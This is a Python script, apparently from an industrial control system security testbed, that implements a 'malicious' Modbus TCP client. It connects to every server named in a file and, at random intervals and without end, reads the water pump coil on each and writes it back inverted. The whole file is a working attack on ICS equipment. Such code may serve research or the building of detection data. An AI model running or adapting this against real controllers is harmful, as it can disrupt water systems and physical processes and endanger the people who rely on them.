import logging
import threading
import time
import random
from datetime import datetime
from pyModbusTCP.client import ModbusClient

# Register to maliciously modify
WATER_PUMP_ADDR = 0

# file path to Modbus TCP servers
file_path = 'ModbusServers.txt'

# define log file
logging.basicConfig(level=logging.INFO, filename="/var/log/OT/MaliciousClient.log", filemode="w", format='%(asctime)s - %(levelname)s - %(message)s')
random.seed(int(datetime.now().timestamp()))

class Session(threading.Thread):
    def __init__(self,server_ip,server_port,unit_id):
        super().__init__()
        self.server_ip = server_ip
        self.server_port = server_port
        self.unit_id = unit_id
        self.client = ModbusClient(host=server_ip,port=server_port,unit_id=unit_id)
    
    def connect(self):
        while not self.client.is_open:
            if not self.client.open():
                print(f"    Failed to open session with server: {self.server_ip}, ID: {self.unit_id}")
                logging.warning(f"Failed to open session with server: {self.server_ip}, ID: {self.unit_id} ")
                print(f"try again connecting server: {self.server_ip}, ID: {self.unit_id} in 5 seconds...")
                time.sleep(5)
            else:
                print(f"    Connected to server: {self.server_ip}, ID: {self.unit_id}")
                logging.info(f"connected to server: {self.server_ip}, ID: {self.unit_id}")

    def run(self):
        self.connect()
        while True:
            try:
                if self.client.is_open:                                                                                                    # check if server is running
                    time_to_att = random.randrange(1,60)                                                                                   # pick a random time to launch the attack
                    print(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
                    logging.info(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
                    time.sleep(time_to_att)
                    water_pump_current = self.client.read_coils(WATER_PUMP_ADDR,1)[0]                                                      # read current water pump coil status
                    if self.client.write_single_coil(WATER_PUMP_ADDR,water_pump_current ^ 1) is not True:                                  # water_pump_status = cuurent XOR 1
                        logging.warn(f"couldn't write a single coil to {self.server_ip}:{self.server_port}")
                    else:
                        print(f"{datetime.now().isoformat()} : write value {water_pump_current^1} to {self.server_ip} water pump")
                        logging.info(f"write value {water_pump_current^1} to {self.server_ip} water pump")

                else:
                    self.connect()                                                                                                         # try to reconnect server

            except Exception as e:
                logging.error(f"{e}")
                self.connect()




def start_modbus_client(file_path):
    servers_list = []
    f = open(file_path,"r")
    for line in f:
        parts = line.split()
        if len(parts) == 3:
            servers_list.append((parts[1],int(parts[2])))                                                                                  # append (ip_address, unit_id)
    print(servers_list)
    sessions = [Session(ip,502,unit_id) for (ip,unit_id) in servers_list]
    for session in sessions:
        session.start()                                                                                                                    # start session as a thread

    for session in sessions:
        session.join()                                                                                                                     # join thread when done

if __name__ == "__main__":
    start_modbus_client(file_path)
